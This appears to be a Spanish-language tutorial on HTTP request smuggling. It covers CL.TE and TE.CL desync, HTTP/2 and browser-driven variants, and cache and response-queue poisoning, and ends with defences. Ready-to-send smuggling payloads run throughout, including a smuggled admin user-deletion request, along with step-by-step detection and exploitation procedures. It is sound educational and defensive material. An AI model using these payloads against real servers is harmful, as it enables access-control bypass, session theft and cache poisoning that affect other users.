# 🌐 HTTP request smuggling

## 🔎 ¿Qué es HTTP Request Smuggling?

HTTP request smuggling es una técnica que interfiere con cómo un sitio web procesa secuencias de peticiones HTTP recibidas de uno o más usuarios. Cuando un servidor front-end (reverse proxy, load balancer, CDN) reenvía peticiones a un servidor back-end, comparten una conexión TCP para mayor eficiencia. Si estos dos servidores no están de acuerdo sobre dónde termina una petición y comienza la siguiente, un atacante puede anteponer contenido malicioso a la siguiente petición de otro usuario.

***

## ⚙️ Cómo funciona Request Smuggling

El problema principal es el desacuerdo entre dos cabeceras que especifican la longitud del cuerpo de la petición:

### 📏 Content-Length - especifica el tamaño del body en bytes:

```http
POST / HTTP/1.1
Content-Length: 11

hello=world
```

### 📦 Transfer-Encoding: chunked - el body se envía en chunks:

```http
POST / HTTP/1.1
Transfer-Encoding: chunked

b
hello=world
0

```

⚠️ Cuando ambas cabeceras están presentes y el front-end y el back-end priorizan diferentes, se produce un desync.


## 🔀 Escenarios CL.TE y TE.CL
 
HTTP Request Smuggling se produce cuando el **frontend (proxy)** y el **backend (servidor)** discrepan en cómo interpretan los límites de una petición HTTP. Esta ambigüedad permite a un atacante "contrabandear" una petición dentro de otra, afectando a usuarios legítimos del mismo servidor.
 
Las dos cabeceras implicadas son:
 
- **`Content-Length` (CL)** — indica el tamaño exacto del body en bytes.
- **`Transfer-Encoding: chunked` (TE)** — indica que el body se envía en fragmentos, y que el fragmento `0` marca el final.
---
 
## 🧩 Escenario 1 — CL.TE
 
### 🧠 Lógica del escenario
 
| Componente | Interpreta | Ignora |
|---|---|---|
| Frontend | `Content-Length` | `Transfer-Encoding` |
| Backend | `Transfer-Encoding` | `Content-Length` |
 
El frontend valida la petición usando `Content-Length`. Si el valor no coincide exactamente con el tamaño real del body, la rechaza y nunca llega al backend. Una vez que el CL es correcto, la petición pasa al backend.
 
El backend, en cambio, usa `Transfer-Encoding: chunked`. Lee el body hasta encontrar el fragmento `0`, que le indica que el chunk ha terminado. **Todo lo que viene después del `0` lo interpreta como una nueva petición.**
 
### 🧪 Petición smugleada
 
```http
POST /admin HTTP/1.1
Host: pagina.com
Cookies:
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Transfer-Encoding: chunked
 
0
 
POST /admin/delete?user=juan
Host: 127.0.0.1
Content-Length: 5
 
x=1
```
 
> **Frontend:** Lee CL=55. El body tiene exactamente 55 bytes → reenvía al backend.  
> **Backend:** Lee chunked. El `0` le dice que el chunk terminó. Lo siguiente (`POST /admin/delete…`) lo procesa como una petición nueva e independiente.
  
### ✅ Verificación del escenario CL.TE
 
El objetivo es confirmar que el **frontend ignora TE** y el **backend sí lo procesa**.
 
#### ➡️ Paso 1 — Provocar un error de sincronización
 
Enviamos una petición con `Transfer-Encoding: chunked` pero con un body inválido para chunked (`x=x`):
 
```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
 
x=x
```
 
El frontend ignora TE y reenvía 3 bytes del body. El backend recibe un chunk inválido y responde con un **error de sincronización**. Esto confirma que el front no procesa TE pero el back sí.
 
#### ➡️ Paso 2 — Validar que el chunk `0` es correcto
 
Enviamos una petición bien formada con el cierre de chunk:
 
```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked
 
0

```
 
Esta petición responde **200 OK**.
 
Para confirmar que el backend realmente valida el chunked, cambiamos el `0` por `X`:
 
```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked
 
X

```
 
El backend **rechaza** la petición porque `X` no es un cierre de chunk válido. Escenario confirmado.
 
#### ➡️ Paso 3 — Explotar el escenario
 
Con el escenario confirmado, construimos el payload smugleado. El `Content-Length` global se mide **hasta el `0` de cierre del chunk** (inclusivo). El resto es la petición smugleada.
 
```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked
 
0
 
GET /error HTTP/1.1
X-Ignore: x
```
 
> Al enviar esta petición **dos veces seguidas**, la segunda solicitud llega al backend con el prefijo smugleado. El servidor procesa el `GET /error` como una nueva petición y responde **404**, confirmando la explotación.
 
---
 
## 🧩 Escenario 2 — TE.CL
 
### 🧠 Lógica del escenario
 
| Componente | Interpreta | Ignora |
|---|---|---|
| Frontend | `Transfer-Encoding` | `Content-Length` |
| Backend | `Content-Length` | `Transfer-Encoding` |
 
El frontend lee el body en modo chunked y para cuando encuentra el `0` de cierre. El backend, en cambio, usa `Content-Length` para saber cuántos bytes leer del body. **Todo lo que supere ese CL queda en el buffer del backend y se antepone a la siguiente petición entrante.**
 
### 🧪 Construcción de la petición smugleada
 
La construcción requiere calcular tres valores con precisión.
 
#### ➡️ Paso 1 — Añadir el payload smugleado como chunk
 
```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked
 
9f
POST /404 HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
 
x=1
 
0

```
 
El valor `9f` es el **tamaño en hexadecimal** del bloque que comienza en `POST /404` y termina en `x=1` (sin incluir el `0` final). El `0` al final marca el cierre del chunk para el frontend.
 
> **Cómo calcular `9f`:** Selecciona el texto desde `POST /404 HTTP/1.1` hasta la última línea del body interno (`x=1`), cuenta los bytes y conviértelos a hexadecimal.
 
#### ➡️ Paso 2 — Calcular el Content-Length de la petición interna
 
El `Content-Length` de la petición smugleada (`POST /404`) se calcula en base al body de esa petición interna (`x=1`). Puede ser igual o **mayor** que el tamaño real sin problema — eso hace que el backend espere más bytes, leyendo del buffer de la siguiente petición legítima.
 
#### ➡️ Paso 3 — Calcular el Content-Length global
 
El `Content-Length` de la petición externa solo debe cubrir el **número de línea del chunk** (es decir, el valor `9f` más el CRLF que lo sigue). En este ejemplo, eso equivale a **4 bytes**.
 
```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
 
9f
POST /404 HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
 
x=1
 
0

```
 
> **Frontend:** Lee chunked. El chunk `9f` contiene la petición smugleada. El `0` marca el fin → reenvía todo al backend.  
> **Backend:** Lee CL=4. Solo procesa `9f\r\n`. El resto del body (el `POST /404…`) queda en el buffer y se antepone a la siguiente petición entrante.
 
---
 
## 📊 Resumen de valores a calcular
 
| Escenario | Valor | Cómo calcularlo |
|---|---|---|
| **CL.TE** | `Content-Length` global | Contar bytes desde el inicio del body hasta el `0` de cierre (inclusive) |
| **TE.CL** | Tamaño del chunk (hex) | Contar bytes del payload smugleado y convertir a hexadecimal |
| **TE.CL** | `Content-Length` interno | Tamaño del body de la petición smugleada (puede ser mayor) |
| **TE.CL** | `Content-Length` global | Bytes que ocupa únicamente la línea con el valor del chunk |
 
 
## ⚔️ Comparativa rápida
 
| | CL.TE | TE.CL |
|---|---|---|
| **Frontend usa** | `Content-Length` | `Transfer-Encoding` |
| **Backend usa** | `Transfer-Encoding` | `Content-Length` |
| **El smuggling ocurre porque** | El back procesa lo que hay tras el `0` del chunk | El back solo lee hasta su CL, lo demás queda en buffer |
| **Confirmación** | Cambiar `0` por `X` → el back rechaza | Enviar dos veces y observar la respuesta de la segunda |


## 💥 Impacto:

* Bypass de controles de seguridad del front-end (WAFs, restricciones de acceso)
* Robo de credenciales y cookies de sesión de otros usuarios
* Ejecución de XSS reflejado sin interacción del usuario
* Envenenamiento de cachés web para servir contenido malicioso
* Secuestro de cuentas admin mediante response queue poisoning


***

## 🚀 Variantes de HTTP/2 Smuggling

HTTP/2 introduce nuevos vectores cuando los servidores hacen downgrade a HTTP/1.1:

### 🔹 H2.CL:

* Front-end usa longitud de frame HTTP/2
* Back-end usa Content-Length tras downgrade

### 🔹 H2.TE:

* Front-end: longitud de frame HTTP/2
* Back-end: `Transfer-Encoding: chunked` → desync

### 🔹 CRLF Injection:

```
# Header HTTP/2
foo: bar\r\nTransfer-Encoding: chunked

# HTTP/1.1 lo interpreta como dos headers
```

### 🔹 Request Tunnelling:

* Se hace smuggling usando peticiones HEAD
* El front-end sobrelee y expone respuestas encapsuladas

***

## 🌐 Variantes impulsadas por el navegador

### 🔹 CL.0:

```http
POST /resources/image.svg HTTP/1.1
Content-Length: 30

GET /admin HTTP/1.1
Foo: x
0
```

### 🔹 0.CL:

* Front-end ignora Content-Length
* Back-end lo procesa
* Requiere un early response gadget

### 🔹 Client-Side Desync:

```javascript
fetch(url, {method:'POST', body:'smuggled request', mode:'cors'})
.catch(() => fetch(url, {mode:'no-cors'}))
```

### Pause-Based:

* Enviar headers
* Pausar antes del body
* El servidor responde sin consumir el body
* El body se convierte en la siguiente petición

***

## 🎯 Tipos de ataque

### 💣 Response Queue Poisoning:

* Se inyecta una petición completa
* El back-end envía 2 respuestas
* El front-end espera 1 → desincronización
* Usuarios reciben respuestas incorrectas

### 📦 Web Cache Poisoning:

* Se inyecta redirección maliciosa
* Se cachea para un recurso estático
* Todos los usuarios reciben contenido malicioso

### 🕵️ Web Cache Deception:

* Se smugglea `GET /my-account`
* Se usa la sesión de la víctima
* La página se cachea como recurso público

***

## 🛡️ Buenas prácticas de defensa

### Usar HTTP/2 end-to-end:

* Evitar downgrade a HTTP/1.1
* HTTP/2 elimina ambigüedad en límites de petición

### Normalizar peticiones ambiguas:

* Rechazar peticiones con `Content-Length` y `Transfer-Encoding`
* Eliminar `Transfer-Encoding` en downgrade
* Sanear secuencias `\r\n`

### No reutilizar conexiones back-end:

* Usar una conexión por cliente
* Evitar contaminación entre usuarios
* Validar correctamente los límites de petición

### Asegurar endpoints estáticos:

* Asegurar que consumen correctamente el body
* No asumir que no recibirán POST requests
